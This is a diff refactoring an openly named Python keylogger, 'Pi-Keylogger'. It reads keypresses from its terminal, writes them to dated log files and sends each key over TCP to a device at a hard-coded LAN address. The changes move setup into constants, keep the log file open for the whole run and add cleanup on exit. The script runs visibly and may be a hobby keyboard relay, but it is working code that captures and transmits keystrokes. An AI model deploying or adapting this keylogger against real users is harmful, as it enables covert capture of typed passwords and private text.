@@ -6,45 +6,17 @@ import os
 
 os.system("stty -ixon")  # Disable Ctrl+S flow control
 
-def log(char, date):
-    """Log keypresses to a file and send them over TCP."""
-    keycode = ord(char)
-    print(f"Logging and sending keycode {keycode}")
-    send_key(char)
-
-    if keycode == 5:
-        exit()
-
-    key_mappings = {
-        13: "\n",
-        127: "<Backspace>",
-        218: "<Up>",
-        217: "<Down>",
-        216: "<Left>",
-        215: "<Right>"
-    }
-
-    char = key_mappings.get(keycode, char)
-
-    log_path = f"/home/rikka/Pi-Keylogger/log/{date}.txt"
-    with open(log_path, "a+") as f:
-        f.write(char)
-        # f.flush()  # Ensures immediate writing
-
-def arrow(char):
-    """Convert arrow key escape sequences to keycodes."""
-    arrow_mappings = {
-        65: 218,  # Up Arrow
-        67: 215,  # Right Arrow
-        68: 216,  # Left Arrow
-        66: 217   # Down Arrow
-    }
-    return arrow_mappings.get(ord(char))
-
+# Constants
 PICO_IP = "192.168.36.30"  # Change if needed
 PORT = 12345
+LOG_DIR = "/home/rikka/Pi-Keylogger/log"
+DATE = time.strftime("%c").replace(" ", "-")
+LOG_PATH = f"{LOG_DIR}/{DATE}.txt"
+
+# Global Variables
 sock = None  # Declare socket globally
 lock = threading.Lock()  # Prevent concurrent socket access
+
 
 def connect():
     """Try to establish a TCP connection to the Pico."""
@@ -78,37 +50,69 @@ def send_key(char):
             sock.close()
             sock = None  # Mark socket as disconnected
 
+
+def log(char, f):
+    """Log keypresses to an already open file and send them over TCP."""
+    try:
+        keycode = ord(char)
+        print(f"Logging and sending keycode {keycode}")
+        send_key(char)
+
+        if keycode == 5:
+            raise SystemExit("Exiting due to keycode 5 (Ctrl+E)")
+
+        key_mappings = {
+            13: "\n", 127: "<Backspace>", 218: "<Up>",
+            217: "<Down>", 216: "<Left>", 215: "<Right>"
+        }
+
+        f.write(key_mappings.get(keycode, char))
+        f.flush()  # Ensures immediate writing
+    except Exception as e:
+        print(f"Logging error: {e}")
+
+
+def arrow(char):
+    """Convert arrow key escape sequences to keycodes."""
+    return {65: 218, 67: 215, 68: 216, 66: 217}.get(ord(char))
+
+
 # Start the reconnect thread
 threading.Thread(target=connect, daemon=True).start()
 
-date = time.strftime("%c").replace(" ", "-")
-print(date)
+# Ensure log directory exists
+os.makedirs(LOG_DIR, exist_ok=True)
 
-with open(f"/home/rikka/Pi-Keylogger/log/{date}.txt", "w+") as f:
-    f.write(f"Started at {date}\n")
+# Open log file once and use throughout execution
+try:
+    with open(LOG_PATH, "w+") as f:
+        f.write(f"Started at {DATE}\n")
+        f.flush()  # Ensure initial write is saved
 
-print("Keylogger started!")
+        print("Keylogger started!")
 
-while True:
-    try:
-        char = getch.getch()
-        if ord(char) == 27:  # Escape sequence (arrow keys, etc.)
-            _char = getch.getch()
-            if ord(_char) == 91:  # Arrow key indicator
-                char = chr(arrow(getch.getch()))
-                log(char, date)
-            else:
-                log(char, date)
-                log(_char, date)
-        else:
-            log(char, date)
-    except KeyboardInterrupt:
-        print("Handled Ctrl+C")
-        log(chr(3), date)
-    except Exception as e:
-        print(f"Error: {e}")
-        time.sleep(0.1)
-
-with lock:
-    if sock:
-        sock.close()
+        while True:
+            try:
+                char = getch.getch()
+                if ord(char) == 27:  # Escape sequence (arrow keys, etc.)
+                    _char = getch.getch()
+                    if ord(_char) == 91:  # Arrow key indicator
+                        char = chr(arrow(getch.getch()))
+                        log(char, f)
+                    else:
+                        log(char, f)
+                        log(_char, f)
+                else:
+                    log(char, f)
+            except KeyboardInterrupt:
+                print("Handled Ctrl+C")
+                log(chr(3), f)
+                break  # Exit the loop gracefully
+            except Exception as e:
+                print(f"Error: {e}")
+                time.sleep(0.1)
+finally:
+    with lock:
+        if sock:
+            sock.close()
+    print("Keylogger stopped. Log file closed.")
